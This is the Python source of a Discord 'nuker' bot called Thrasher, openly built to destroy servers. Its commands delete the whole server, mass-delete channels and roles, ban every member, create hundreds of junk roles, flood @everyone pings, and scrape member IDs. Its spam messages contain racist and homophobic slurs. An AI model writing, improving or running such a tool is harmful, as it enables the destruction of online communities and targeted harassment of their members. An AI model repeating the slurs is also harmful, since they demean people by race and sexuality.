
from wsgiref import headers
import discord, json, ctypes, colorama, os, random, requests, time
import threading
from colorama import Fore, init
from discord.ext import commands
init()
os.system("cls")
with open ('config.json') as f:
    config = json.load(f)
prefix = config.get('prefix')
token = config.get('token')

    
intents = discord.Intents.all()
thrasher = commands.Bot(prefix, self_bot = False, intents=intents)
thrasher.remove_command("help")
botversion = "v1.0"
emcolor = 0x2f3136
ctypes.windll.kernel32.SetConsoleTitleW(f"[Thrasher Selfbot]")
@thrasher.command()
async def cc(ctx, name):
    await ctx.message.delete()
    channel = ctx.message.guild
    await channel.create_text_channel(name)
    print(f'{Fore.WHITE}[+]|{Fore.RED}The channel {name} has been created')

@thrasher.command()
async def help(ctx, category=None):
    await ctx.message.delete()
    if category is None:
        await ctx.send(f"""```ini
↓       [ Thrasher Nuker ]        ↓
──────────────────────────────────   
{prefix}info  |» Show Info Commands  (3)
{prefix}nuke  |» Show Nuke Commands  (9)
{prefix}fun   |» Show Fun Commands   (1)
{prefix}admin |» Show Admin Commands (4)

#help
```""")
    elif str(category) == "info":
        await ctx.send(f"""```ini
↓           [ Info ]              ↓
──────────────────────────────────   
{prefix}cinfo |» Display Info About Thrasher
{prefix}ping  |» Shows The Bots Current Latency Ping
{prefix}binfo |» Displays Bot Info

#info
```""")
    elif str(category) == "nuke":
        await ctx.send(f"""```ini
↓            [ Nuke ]            ↓ 
──────────────────────────────────   
{prefix}servdel |» Delete's The Current Server
{prefix}mcc     |» Mass Creates Channels | Usage: {prefix}mcc [channelnames] [amount]
{prefix}esp     |» Everyone Spam Pings
{prefix}espstop |» Stop Everyone Spam Pings
{prefix}rs      |» Spams 250 roles
{prefix}mdc     |» Mass Deletes Channels
{prefix}mdr     |» Mass Deletes Roles
{prefix}massban |» Mass Bans The Server
{prefix}scrape  |» Scrapes IDS From The Server

#nuke            
```""")
    elif str(category) == "fun":
        await ctx.send(f"""```ini
↓           [ Fun ]              ↓
──────────────────────────────────   
{prefix}memes |» Sends Random Memes

#fun
```""")
    elif str(category) == "admin":
        await ctx.send(f"""```ini
↓           [ Admin ]            ↓
──────────────────────────────────   
{prefix}cr    |» Create a Role | Usage: {prefix}cr [rolename  
{prefix}cc    |» Creates a Channel | Usage: {prefix}cc [channelname]  
{prefix}roles |» Displays all roles in the server   
{prefix}esn   |» Edits The Servers name | {prefix}esn [servername] 

#admin               
```""")
    
@thrasher.command()
async def cinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    user = ctx.author
    await ctx.send(f"""```ini
    User: {thrasher.user}
    ID: {thrasher.user.id}
    Prefix: {prefix}
    Latency: {round (thrasher.latency * 1000)} ms
    Version: The Bot Is In Version: {botversion}
```""")
@thrasher.command()
async def servdel(ctx):
    await ctx.message.delete()
    server = ctx.message.guild
    await server.delete()
    print(f"{Fore.RED}[+]{server} Has Been Deleted")



@thrasher.event
async def on_ready():
    await thrasher.change_presence(status=discord.Status.do_not_disturb, activity=discord.Streaming(name="Winter the snow", url='https://www.twitch.tv/fazesway'))
    menu()

def menu():
    servers = len(thrasher.guilds)
    print(f'''{Fore.WHITE}
                           
                              {Fore.WHITE}████████╗██╗  ██╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
                              {Fore.WHITE}╚══██╔══╝██║  ██║██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
                              {Fore.WHITE}   ██║   ███████║██████╔╝███████║███████╗███████║█████╗  ██████╔╝
                               {Fore.RED}  ██║   ██╔══██║██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
                               {Fore.RED}  ██║   ██║  ██║██║  ██║██║  ██║███████║██║  ██║███████╗██║  ██║
                               {Fore.RED}  ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                 {Fore.RED}─────────────────────────     
                                                    {Fore.WHITE}Login: [{thrasher.user}]
                                                    Prefix: [{thrasher.command_prefix}]
                                                    Version: [{botversion}]
                                                    Servers: [{servers}]
                                                    Developer: [t.me/cultfed]    
                                                  {Fore.RED}─────────────────────────
                          
                                                

    ''')

@thrasher.command()
async def ping(ctx):
    pingmsg = f"{round (thrasher.latency * 1000)} ms"
    await ctx.message.edit(content=pingmsg)
@thrasher.command()
async def mcc(ctx, name, amount):
    await ctx.message.delete()
    channel = ctx.message.guild
    await channel.create_text_channel(name)
    for i in range(int(amount)):
        threading.Thread(target=mcc, args=(name,  amount)).start()


  
masspings = "@everyone GET FUCKING WHIZZED FAGGOT", "@everyone VEILSEC RUNS ALL NIGGER", " @everyone WHERES THE ANTINUKE G"
@thrasher.command()
async def esp(channel):
    await channel.message.delete()
    global espstop
    espstop = False
    while True:
        await channel.send(random.choice(masspings))
        if espstop == True:
            break
@thrasher.command()
async def espstop(ctx):
    await ctx.message.delete()
    global espstop
    espstop = True
    if espstop == True:
        await ctx.send("`Everyone spam ping is has stopped`")
memesmsgctx = "https://cdn.discordapp.com/attachments/932811437234077750/932818588744687616/video0.mov", "https://cdn.discordapp.com/attachments/932811437234077750/932819283057193000/CF24EB74-2232-4373-9BEA-A302CE2B36FA.png", "https://cdn.discordapp.com/attachments/932811437234077750/932819683697119252/video0.mp4", "https://cdn.discordapp.com/attachments/932812544081559602/932819962526048296/video0.mov"
@thrasher.command()
async def memes(ctx):
    memesmsg = memesmsgctx
    await ctx.message.delete()
    await ctx.send(random.choice(memesmsg))
@thrasher.command()
async def binfo(ctx):
    await ctx.send("[+] THIS COMMAND NO LONGER EXISTS: ERROR")
@thrasher.command()
async def cr(ctx, *, name):
	guild = ctx.guild
	await guild.create_role(name=name)
	print(f'{Fore.WHITE}[+]|{Fore.RED}Role `{name}` has been created')
@thrasher.command()
async def rs(ctx):
    await ctx.message.delete()
    guilds = ctx.guild
    for i in range(int(250)):
        await guilds.create_role(name="cult ran you")
        print(f'{Fore.WHITE}[+]|{Fore.RED}The role "cult ran you" has been created')
        os.system("cls")
        menu()
@thrasher.command()
async def scrape(ctx, guildid):
    await ctx.message.delete()
    global membercount, guildget
    await thrasher.wait_until_ready()
    guildget = thrasher.get_guild(int(guildid))
    members = await guildget.chunk()
    try:
        os.remove('scrapes/members.txt')
    except:
        pass

    membercount = 0
    with open('scrapes/members.txt', 'a') as h:
        for member in members:
            h.write(str(member.id) + "\n")
            membercount += 1
            

  
            print(f"Succesfully Scraped {membercount} Members")
    channelcount = 0
    with open('scrapes/channels.txt', 'a') as f:
        for channel in guildget.channels:
            f.write(str(channel.id) + "\n")
            channelcount += 1
            print(f"Succesfully Scraped {channelcount} channels")
    rolecount = 0
    with open('scrapes/roles.txt', 'a') as r:
        for role in guildget.roles:
            r.write(str(role.id) + "\n")
            rolecount += 1
            print(f"Succesfully Scraped {rolecount} roles")
            os.system("cls")
            menu()

@thrasher.command()
async def roles(ctx):
    rr = ctx.guild.roles
    await ctx.send(rr)

@thrasher.command()
async def mdc(ctx):
    await ctx.message.delete()
    channel = open('scrapes/channels.txt')
    for channel in ctx.guild.channels:
        await channel.delete()
        print(f"Channel Was Deleted")
        os.system("cls")
        menu()
@thrasher.command()
async def massban(ctx):
    await ctx.message.delete()
    users = open('scrapes/members.txt')
    for users in ctx.guild.members:
        await users.ban()
        print("User Has Been Banned")
        os.system("cls")
        menu()
@thrasher.command()
async def mdr(ctx):
    await ctx.message.delete()

    for role in ctx.guild.roles:

        if str(role) == '@everyone':
            continue

        try:
            await role.delete()
        except discord.Forbidden:
            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{role.name} has been deleted in {ctx.guild.name}")
            os.system("cls")

    print("Roles deleted skid")
    os.system("cls")
    menu()
@thrasher.command()
async def esn(ctx, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)
@thrasher.command()
async def cls(ctx):
    await ctx.message.delete()
    os.system("cls")
    menu()
thrasher.run(token, bot=True)
